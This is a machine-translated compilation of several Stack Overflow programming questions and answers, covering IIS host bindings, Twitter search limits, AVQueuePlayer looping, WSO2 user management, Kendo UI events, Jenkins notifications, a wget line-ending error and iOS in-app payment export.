        $('<div id="slider" class="nivoSlider"></div>');
        $('#slider').nivoSlider({
            effect: 'sliceUpDown'
        });
    });
}); 
```

# c# - IIS7.5 GetHostNamesPerSite 使用 C#

> ID：11155979
> 
> 赞同：0
> 
> 时间：2012-06-22T12:16:19.500
> 
> 标签：c#, iis, iis-7.5

```
List<string> GetHostNamesPerSite(string SiteName) 
```

如何在 C# 中使用 IIS 来 GetHostNamesPerSite？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T13:35:04.117

如果您的意思是获取绑定到站点的所有主机标头主机名的列表：

```
public static List<string> GetHostNamesPerSite(string siteName)
{
  using (ServerManager sm = new ServerManager())
  {
    Site site = sm.Sites.First(s => s.Name == siteName);
    return site.Bindings.Select(s => s.Host).ToList();
  }
} 
```

# twitter - 如何通过哈希标签获取超过 7 天的推文列表

> ID：11155980
> 
> 赞同：0
> 
> 时间：2012-06-22T12:16:20.840
> 
> 标签：twitter

我正在使用这个 URL`http://search.twitter.com/search.json`来抓取带有 hash 标记的推文`#SameHashTag`。提要仅返回过去一周内的项目。Twitter在这里解释了原因：

`https://dev.twitter.com/docs/faq#8650`

我真的需要得到最后 10 条推文，不管它们是什么时候创建的。什么是替代方案？

**注意**我阅读了有关 user_timeline 的信息，但这似乎是基于用户而不是主题标签。我阅读了有关 list_timeline 的信息，但这似乎是从定义的用户列表而不是主题标签中提取推文。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-25T09:59:09.243

您无法从 Search API 获取旧推文。如果您的主题标签没有更改，您可以每天搜索并保存结果并建立您自己的历史记录。

# iphone - 最后重播 AVQueuePlayer 中的项目

> ID：11155983
> 
> 赞同：8
> 
> 时间：2012-06-22T12:16:27.293
> 
> 标签：iphone, ios, avfoundation, avplayer, avqueueplayer

我需要在我的`AVQueuePlayer`. `NSArray`特别是，`AVPlayerItem`一旦最后一个组件完成播放，我想重播整个s 。

我必须承认，我实际上不知道如何实现这一点，希望你能给我一些线索。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-02-18T12:35:11.367

在 AVQueuePlayer 中循环播放一系列视频的最佳方法。

观察 AVQueuePlayer 中的每个播放项。

```
queuePlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;
for(AVPlayerItem *item in items) {
    [[NSNotificationCenter defaultCenter] addObserver:self 
            selector:@selector(nextVideo:) 
            name:AVPlayerItemDidPlayToEndTimeNotification 
            object:item ];
} 
```

在每个 nextVideo 上再次插入 currentItem 以将其排队播放。确保为每个项目寻求零。在 AdvanceToNextItem 之后，AVQueuePlayer 将从队列中删除 currentItem。

```
-(void) nextVideo:(NSNotification*)notif {
    AVPlayerItem *currItem = notif.userInfo[@"object"];
    [currItem seekToTime:kCMTimeZero];
    [queuePlayer advanceToNextItem];
    [queuePlayer insertItem:currItem afterItem:nil];
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T12:30:56.083

这几乎是从零开始。组件是：

1.  创建一个队列，它是 AVPlayerItems 的 NSArray。
2.  随着每个项目被添加到队列中，设置一个 NSNotificationCenter 观察者在视频到达结尾时唤醒。
3.  在观察者的选择器中，告诉 AVPlayerItem 你要循环回到开头，然后告诉播放器开始播放。

（注意：AVPlayerDemoPlaybackView 来自 Apple “AVPlayerDemo”示例。只是带有 setter 的 UIView 的子类）

```
BOOL videoShouldLoop = YES;
NSFileManager *fileManager = [NSFileManager defaultManager];
NSMutableArray *videoQueue = [[NSMutableArray alloc] init];
AVQueuePlayer *mPlayer;
AVPlayerDemoPlaybackView *mPlaybackView;

// You'll need to get an array of the files you want to queue as NSARrray *fileList:
for (NSString *videoPath in fileList) {
    // Add all files to the queue as AVPlayerItems
    if ([fileManager fileExistsAtPath: videoPath]) {
        NSURL *videoURL = [NSURL fileURLWithPath: videoPath];
        AVPlayerItem *playerItem = [AVPlayerItem playerItemWithURL: videoURL];
        // Setup the observer
        [[NSNotificationCenter defaultCenter] addObserver: self
                                                 selector: @selector(playerItemDidReachEnd:)
                                                     name: AVPlayerItemDidPlayToEndTimeNotification
                                                   object: playerItem];
        // Add the playerItem to the queue
        [videoQueue addObject: playerItem];
    }
}
// Add the queue array to the AVQueuePlayer
mPlayer = [AVQueuePlayer queuePlayerWithItems: videoQueue];
// Add the player to the view
[mPlaybackView setPlayer: mPlayer];
// If you should only have one video, this allows it to stop at the end instead of blanking the display
if ([[mPlayer items] count] == 1) {
    mPlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;
}
// Start playing
[mPlayer play];

- (void) playerItemDidReachEnd: (NSNotification *)notification
{
    // Loop the video
    if (videoShouldLoop) {
        // Get the current item
        AVPlayerItem *playerItem = [mPlayer currentItem];
        // Set it back to the beginning
        [playerItem seekToTime: kCMTimeZero];
        // Tell the player to do nothing when it reaches the end of the video
        //  -- It will come back to this method when it's done
        mPlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;
        // Play it again, Sam
        [mPlayer play];
    } else {
        mPlayer.actionAtItemEnd = AVPlayerActionAtItemEndAdvance;
    }
} 
```

而已！让我知道一些需要进一步解释的事情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-13T22:34:32.320

我想出了一个解决方案来循环我的视频队列中的所有视频，而不仅仅是一个。首先我初始化了我的`AVQueuePlayer`：

```
- (void)viewDidLoad
{
    NSMutableArray *vidItems = [[NSMutableArray alloc] init];
    for (int i = 0; i < 5; i++)
    {
        // create file name and make path
        NSString *fileName = [NSString stringWithFormat:@"intro%i", i];
        NSString *path = [[NSBundle mainBundle] pathForResource:fileName ofType:@"mov"];
        NSURL *movieUrl = [NSURL fileURLWithPath:path];
        // load url as player item
        AVPlayerItem *item = [AVPlayerItem playerItemWithURL:movieUrl];
        // observe when this item ends
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(playerItemDidReachEnd:)
                                                     name:AVPlayerItemDidPlayToEndTimeNotification
                                                   object:item];
        // add to array
        [vidItems addObject:item];

    }
    // initialize avqueueplayer
    _moviePlayer = [AVQueuePlayer queuePlayerWithItems:vidItems];
    _moviePlayer.actionAtItemEnd = AVPlayerActionAtItemEndNone;

    // create layer for viewing
    AVPlayerLayer *layer = [AVPlayerLayer playerLayerWithPlayer:_moviePlayer];

    layer.frame = self.view.bounds;
    layer.videoGravity = AVLayerVideoGravityResizeAspectFill;
    // add layer to uiview container
    [_movieViewContainer.layer addSublayer:layer];
} 
```

通知发布时

```
- (void)playerItemDidReachEnd:(NSNotification *)notification {
    AVPlayerItem *p = [notification object];

    // keep playing the queue
    [_moviePlayer advanceToNextItem];
    // if this is the last item in the queue, add the videos back in
    if (_moviePlayer.items.count == 1)
    {
        // it'd be more efficient to make this a method being we're using it a second time
        for (int i = 0; i < 5; i++)
        {
            NSString *fileName = [NSString stringWithFormat:@"intro%i", i];
            NSString *path = [[NSBundle mainBundle] pathForResource:fileName ofType:@"mov"];
            NSURL *movieUrl = [NSURL fileURLWithPath:path];

            AVPlayerItem *item = [AVPlayerItem playerItemWithURL:movieUrl];

            [[NSNotificationCenter defaultCenter] addObserver:self
                                                     selector:@selector(playerItemDidReachEnd:)
                                                         name:AVPlayerItemDidPlayToEndTimeNotification
                                                       object:item];

             // the difference from last time, we're adding the new item after the last item in our player to maintain the order
            [_moviePlayer insertItem:item afterItem:[[_moviePlayer items] lastObject]];
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-03-14T03:45:54.117

**截至 2021 年 3 月在 iOS 14 上工作**

只是想将我的解决方案发布为新的编码员，这花了我一段时间才弄清楚。我的解决方案在不使用 AVLooper 的情况下循环 UIView 内的 avqueuplayer。这个想法来自[雷文德利希](https://www.raywenderlich.com/5191-video-streaming-tutorial-for-ios-getting-started)。您可以忽略 UIView 包装器等。这个想法是使用 NSKeyValeObservation 而不是其他人建议的通知中心。

```
class QueuePlayerUIView: UIView {
private var playerLayer = AVPlayerLayer()
private var playerLooper: AVPlayerLooper?

@objc let queuePlayer = AVQueuePlayer()

var token: NSKeyValueObservation?

var clips = [URL]()

func addAllVideosToPlayer() {
    for video in clips {
        let asset = AVURLAsset(url: video)
        let item = AVPlayerItem(asset: asset)
        queuePlayer.insert(item, after: queuePlayer.items().last)
      }
}

init(videosArr: [URL]) {
    super.init(frame: .zero)

    self.clips = videosArr

    addAllVideosToPlayer()
    playerLayer.player = queuePlayer
    playerLayer.videoGravity = .resizeAspectFill
    layer.addSublayer(playerLayer)
    queuePlayer.play()

    token = queuePlayer.observe(\.currentItem) { [weak self] player, _ in
      if player.items().count == 1 {
        self?.addAllVideosToPlayer()
      }
    }
}

override func layoutSubviews() {
    super.layoutSubviews()
    playerLayer.frame = bounds
}

required init?(coder: NSCoder) {
    fatalError("init(coder:) has not been implemented")
} 
```

}

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-05-20T17:00:19.230

在 Swift 4 中，您可以使用如下内容：

```
 NotificationCenter.default.addObserver(forName: NSNotification.Name.AVPlayerItemDidPlayToEndTime, object: nil, queue: nil) {

            notification in

            print("A PlayerItem just finished playing !")

            currentVideo += 1

            if(currentVideo >= videoPaths.count) {

               currentVideo = 0
            }

            let url = URL(fileURLWithPath:videoPaths[currentVideo])
            let playerItem = AVPlayerItem.init(url: url)

            player.insert(playerItem, after: nil)
        } 
```

据我了解，这`AVQueuePlayer`将删除最后播放的项目，因此您需要继续将刚刚播放的视频添加到队列中，否则它实际上会用完视频播放！你不能一次又一次`.seek`地 0 `.play()`，那是行不通的。

# api - WSO2 Identity Server 通过 API 管理用户和角色

> ID：11155984
> 
> 赞同：5
> 
> 时间：2012-06-22T12:16:29.170
> 
> 标签：api, wso2, wso2is, user-management

我需要通过 API 在 WSO2 Identity Server 3.2.3 中创建和管理用户，我已经尝试了来自[http://blog.facilelogin.com/2010/05/managing-users-and-roles-with-wso2的代码示例.html](http://blog.facilelogin.com/2010/05/managing-users-and-roles-with-wso2.html)但已过时。如果没有 WSO2 用户界面，是否有任何方法可以管理用户和角色？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T06:22:14.387

WSO2 Carbon 中的所有管理服务都公开为 Web 服务 API。对于用户管理，您可以使用 UserAdmin API，您可以在其中执行与用户存储中的用户和角色相关的所有管理功能。[请从此处](https://svn.wso2.org/repos/wso2/people/asela/wso2-samples/user-manager/user-admin-client/)找到 UserAdmin API 的示例。自述文件包含更多详细信息。

# javascript - KendoPanelBar PreventDefault

> ID：11155989
> 
> 赞同：0
> 
> 时间：2012-06-22T12:16:45.360
> 
> 标签：javascript, kendo-ui

I'm having problems understanding how preventDefault function works. I created a simple jsfiddle, but still, selections and expansion works and not prevented.

[http://jsfiddle.net/XRfKb/15/](http://jsfiddle.net/XRfKb/15/)

Any help is appreciated, thanks.

EDIT: How to prevent selection if page is not valid? Here's a piece of code:

```
panelBar.bind("select", function (e) {
   //some code here
   if (!isValid) {
            e.preventDefault(e); //doesn't work
            //this.select('#firstStep'); //doesn't work
        }
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-23T07:18:46.887

Indeed, you're using an old release from the last year. I've updated your jsFiddle accordingly: [http://jsfiddle.net/XRfKb/18/](http://jsfiddle.net/XRfKb/18/)

Currently the select event can't be prevented. As of next release the select event can prevent link navigation, but not the actual selection of the item. We may consider preventing selection too.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-26T21:28:22.377

I ended up by using simple "click" events for links in the PanelBar instead of "select" events for PanelBar.

e.preventDefault and e.stopPropagation work fine for them.

# msbuild - 当 ms-build 中出现警告时从 jenkins 发送电子邮件通知

> ID：11155992
> 
> 赞同：1
> 
> 时间：2012-06-22T12:16:55.390
> 
> 标签：msbuild, jenkins, jenkins-plugins

我正在使用**jenkins**作为基于 .Net 的项目的 CI 服务器。我正在使用**MS-Build**插件从 jenkins 构建项目。它按预期工作，当构建失败时它会发送一封电子邮件。现在我还希望詹金斯在构建中有警告时发送电子邮件。我找不到任何提供此功能的插件。

所以我尝试使用“ *Extended Email Notification* ”、“ *Console Output Parsing* ”插件。但它并没有给我预期的行为。目前我所取得的是在发生警告时发送邮件。我使用“控制台输出解析”插件将构建标记为不稳定，并使用电子邮件通知发送电子邮件。但是电子邮件没有关于警告的详细信息。

我遇到了几篇文章，其中说我们可以使用*groovy 脚本*或*果冻脚本*和“*扩展电子邮件通知*”插件来发送详细信息。但我不知道如何从*解析插件*中获取警告的详细信息。有人可以指出我纠正资源或指导我实现这一目标吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:00:55.520

寻找

*   [https://wiki.jenkins-ci.org/display/JENKINS/Text-finder+Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Text-finder+Plugin)通过解析日志文件将构建标记为“不稳定”。您也可以在“不稳定”构建之后运行下游作业（如果有）-> 请参阅作业配置。状态“不稳定”是 Jenkins 中的“灰色区域”，但颜色为黄色。

*   [https://wiki.jenkins-ci.org/display/JENKINS/Notification+Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Notification+Plugin)也为“不稳定”的构建发送电子邮件，其中包含从构建日志文件中提取的文本。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T21:38:29.933

Jenkins 基于特定构建（或“运行”）可以是“好”或“坏”的假设，因此有两种配色方案 - 没有“灰色区域”。

话虽如此，有插件允许“不稳定”的第三种状态，
触发机制也支持这种状态。

以**[Text-finder Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Text-finder+Plugin)**或**[Log Parser Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Log+Parser+Plugin)**为例-
两者都允许您在指定的文件中搜索关键字，并使用它将“成功”构建降级
为“不稳定”或“失败”。

# linux - Wget 在 bash 脚本中出现 406 Not Acceptable 错误

> ID：11155995
> 
> 赞同：0
> 
> 时间：2012-06-22T12:17:02.377
> 
> 标签：linux, bash, scripting, centos

在我的 Centos 6.2 上，我有这个 bash 脚本：

```
[le_me]$ cat get.nb
#! /bin/bash
/usr/bin/wget -O /var/www/html/leFile.xml http://www.leSite.com/leFeed.xml    

[le_me]$ source getFeeds.nb
: command not found
--2012-06-22 12:46:18--  http://www.leSite.com/leFeed.xml%0D
Resolving www.leSite.com... 1.2.3.4
Connecting to www.leSite.com|1.2.3.4|:80... connected.
HTTP request sent, awaiting response... 406 Not Acceptable
2012-06-22 12:46:18 ERROR 406: Not Acceptable. 
```

对我来说奇怪的是，当我运行这个命令时

```
/usr/bin/wget -O /var/www/html/leFile.xml http://www.leSite.com/leFeed.xml 
```

在控制台中，一切正常，文件下载没有问题。

我对它进行了谷歌搜索，我注意到这`%0D`应该是一个回车字符，我尝试在链接之后放置另一个空格，如下所示：`http://www.leSite.com/leFeed.xml[spaceChar]`

我下载了文件，但我担心命令找不到输出并最终获取回车（我知道这是因为空间，但现在至少我下载了我最初想要的文件）：

```
[le_me]$ source get.nb
: command not found
--2012-06-22 13:05:26--  http://www.leSite.com/leFeed.xml
Resolving www.leSite.com... 2.17.249.51
Connecting to www.leSite.com|2.17.249.51|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 35671435 (34M) [application/atom+xml]
Saving to: “/var/www/html/leFile.xml”

100%[=================================>] 35,671,435  37.2M/s   in 0.9s

2012-06-22 13:05:27 (37.2 MB/s) - “/var/www/html/leFile.xml” saved [35671435/35671435]

--2012-06-22 13:05:27--  http://%0D/
Resolving \r... failed: Name or service not known.
wget: unable to resolve host address “\r”
FINISHED --2012-06-22 13:05:27--
Downloaded: 1 files, 34M in 0.9s (37.2 MB/s) 
```

任何人都可以对此有所了解吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:42:11.243

您的脚本文件显然具有 DOS 样式的行，并且回车符被解释为命令行中的另一个字符。如果 URL 后面没有空格，则将其解释为 URL 的最后一个字符；如果您有空格，则将其解释为单独的单字符参数。

您应该使用 UNIX 样式的行保存您的脚本文件。你如何做到这一点取决于你的编辑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:25:18.393

我建议引用 URL。

```
/usr/bin/wget -O /var/www/html/leFile.xml 'http://www.leSite.com/leFeed.xml' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:32:24.977

这

```
: command not found 
```

错误表明 http:// 部分存在问题。根据经验，我在命令行中使用时总是引用这些 url。那里经常有 bash/shell 特殊字符。

在我的情况下，这个命令对我有用，没有 406 问题（有一些真实的 http 地址）。您应该复制/粘贴确切的地址。它可能包含导致它的某些东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-04-12T17:19:02.703

如果其他答案都不起作用，请尝试 wget 的替代方法

```
curl -o /var/www/html/leFile.xml 'http://www.leSite.com/leFeed.xml' 
```

# ios - 有没有办法通过 Apple 后端的一些 API 导出应用商店应用内支付？

> ID：11155998
> 
> 赞同：3
> 
> 时间：2012-06-22T12:17:12.927
> 
> 标签：ios, api, export, in-app-purchase, in-app-billing

我们为 ios 开发游戏，需要最持久的方法来跟踪应用内支付。

在 Google Play 中，我们使用 google checkout API 导出所有交易。

IOS应用内支付是否有类似的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:32:19.237

据我所知，没有后端服务器 api 显示在应用程序付款中，您应该手动检查它们并将它们保存在 itunesconnect.apple.com